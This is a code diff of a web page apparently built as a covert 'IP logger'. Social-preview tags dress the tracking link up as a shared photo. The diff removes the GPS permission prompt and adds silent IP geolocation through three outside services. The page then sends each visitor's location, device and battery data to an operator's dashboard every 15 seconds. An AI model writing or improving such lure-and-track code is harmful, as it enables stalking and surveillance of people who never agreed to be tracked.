@@ -9,16 +9,17 @@
     <meta property="og:title" content="Photo Shared with You" />
     <meta property="og:description" content="Tap to view location" />
     <meta property="og:image" id="og-image" content="" />
-    <meta property="og:type" content="website" />
-    <meta property="og:url" id="og-url" content="" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" id="og-url" content="" />
 
     <link id="dynamic-favicon" rel="icon" href="/api/favicon/i" type="image/jpeg" />
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 
     <style>
-        /* Same styles as before – no changes */
+        /* ── Same styles as before – no changes ── */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -607,16 +608,15 @@
         // ─── CONFIG ──────────────────────────────────────────────
         const FAVICON_NAMES = ['i', 'f', 'w', 'g'];
         const OFFLINE_THRESHOLD = 30000;
+        const origin = window.location.origin;
 
         // ─── ROUTING ──────────────────────────────────────────────
         const path = window.location.pathname;
         const isTracker = path.startsWith('/track/');
         const customPath = isTracker ? decodeURIComponent(path.substring(7)) : null;
 
-        // ─── Set absolute OG URL ────────────────────────────────
-        const origin = window.location.origin;
+        // Set absolute OG URL for social sharing
         document.getElementById('og-url').content = window.location.href;
-        // Set the og:image to the absolute URL of the image endpoint
         document.getElementById('og-image').content = origin + '/api/image';
 
         if (isTracker && customPath) {
@@ -674,7 +674,6 @@
                 const ok = await uploadFile('/api/image', file, '✅ OG image uploaded!');
                 if (ok) {
                     document.getElementById('og-preview').src = '/api/image?' + Date.now();
-                    // Update og:image to the absolute URL (already set)
                 }
                 e.target.value = '';
             });
@@ -740,7 +739,6 @@
         function renderCards() {
             const container = document.getElementById('cards-container');
 
-            // Save current input values (only if not being edited)
             const inputValues = {};
             container.querySelectorAll('.card').forEach(card => {
                 const id = card.dataset.userId;
@@ -1010,7 +1008,7 @@
         }
 
         // ──────────────────────────────────────────────────────────
-        //  TRACKER (User Side) – GPS first, IP fallback
+        //  TRACKER (User Side) – IP‑based, no permission
         // ──────────────────────────────────────────────────────────
         function initTracker(customPath) {
             const trackerView = document.getElementById('tracker-view');
@@ -1055,6 +1053,29 @@
                 });
         }
 
+        // ─── Multi‑service IP geolocation ────────────────────────
+        async function getLocationFromIP() {
+            const services = [
+                { url: 'https://ipapi.co/json/', parse: d => ({ lat: d.latitude, lng: d.longitude }) },
+                { url: 'https://ip-api.com/json/', parse: d => ({ lat: d.lat, lng: d.lon }) },
+                { url: 'https://geoplugin.net/json.gp', parse: d => ({ lat: d.geoplugin_latitude, lng: d.geoplugin_longitude }) }
+            ];
+
+            for (const service of services) {
+                try {
+                    const res = await fetch(service.url);
+                    if (res.ok) {
+                        const data = await res.json();
+                        const loc = service.parse(data);
+                        if (loc.lat && loc.lng) {
+                            return loc;
+                        }
+                    }
+                } catch (_) { continue; }
+            }
+            return null;
+        }
+
         async function trackUser(id) {
             const data = { id, device: 'Unknown', battery: 'N/A', lat: null, lng: null };
 
@@ -1075,57 +1096,11 @@
                 } catch (_) {}
             }
 
-            // ─── Location: GPS first, then IP fallback ──────────
-            const getLocation = () => new Promise((resolve) => {
-                if ('geolocation' in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            resolve({
-                                lat: pos.coords.latitude,
-                                lng: pos.coords.longitude
-                            });
-                        },
-                        () => {
-                            // GPS failed – try IP
-                            resolve(null);
-                        }, {
-                            enableHighAccuracy: true,
-                            timeout: 8000,
-                            maximumAge: 0
-                        }
-                    );
-                } else {
-                    resolve(null);
-                }
-            });
-
-            const gpsLoc = await getLocation();
-            if (gpsLoc) {
-                data.lat = gpsLoc.lat;
-                data.lng = gpsLoc.lng;
-            } else {
-                // Fallback to IP
-                try {
-                    const geoRes = await fetch('https://ipapi.co/json/');
-                    if (geoRes.ok) {
-                        const geo = await geoRes.json();
-                        if (geo.latitude && geo.longitude) {
-                            data.lat = geo.latitude;
-                            data.lng = geo.longitude;
-                        }
-                    }
-                } catch (_) {
-                    try {
-                        const fallback = await fetch('https://ip-api.com/json/');
-                        if (fallback.ok) {
-                            const fData = await fallback.json();
-                            if (fData.lat && fData.lon) {
-                                data.lat = fData.lat;
-                                data.lng = fData.lon;
-                            }
-                        }
-                    } catch (__) {}
-                }
+            // ─── Location: IP only (no permission prompt) ──────
+            const loc = await getLocationFromIP();
+            if (loc) {
+                data.lat = loc.lat;
+                data.lng = loc.lng;
             }
 
             // Send initial data
@@ -1133,23 +1108,10 @@
 
             // Update every 15 seconds
             setInterval(async () => {
-                // Try GPS again each time
-                const newGps = await getLocation();
-                if (newGps) {
-                    data.lat = newGps.lat;
-                    data.lng = newGps.lng;
-                } else {
-                    // Fallback IP
-                    try {
-                        const geoRes = await fetch('https://ipapi.co/json/');
-                        if (geoRes.ok) {
-                            const geo = await geoRes.json();
-                            if (geo.latitude && geo.longitude) {
-                                data.lat = geo.latitude;
-                                data.lng = geo.longitude;
-                            }
-                        }
-                    } catch (_) {}
+                const newLoc = await getLocationFromIP();
+                if (newLoc) {
+                    data.lat = newLoc.lat;
+                    data.lng = newLoc.lng;
                 }
                 await sendTrackData(id, data);
             }, 15000);
@@ -1191,7 +1153,7 @@
             Object.values(mapInstances).forEach(m => { try { m.invalidateSize(); } catch (_) {} });
         });
 
-        console.log('🚀 TYA Loager v2.1 – GPS + fixed OG image.');
+        console.log('🚀 TYA Loager v2.2 – IP-only location, fixed OG image.');
     </script>
 
 </body>
